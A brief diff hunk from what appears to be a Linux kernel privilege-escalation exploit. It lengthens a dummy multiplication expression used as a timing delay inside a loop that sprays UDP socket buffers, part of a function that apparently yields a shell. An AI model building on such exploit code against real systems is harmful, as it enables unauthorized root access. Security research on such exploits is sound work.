@@ -311,7 +311,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	{
 		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
 		alloc_ipv4_udp(1);
-		i*i*i*i*i*i*i*i*i*i*i;
+		i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i;
 	}
 
 	// allocate and free 1 skb from freelist
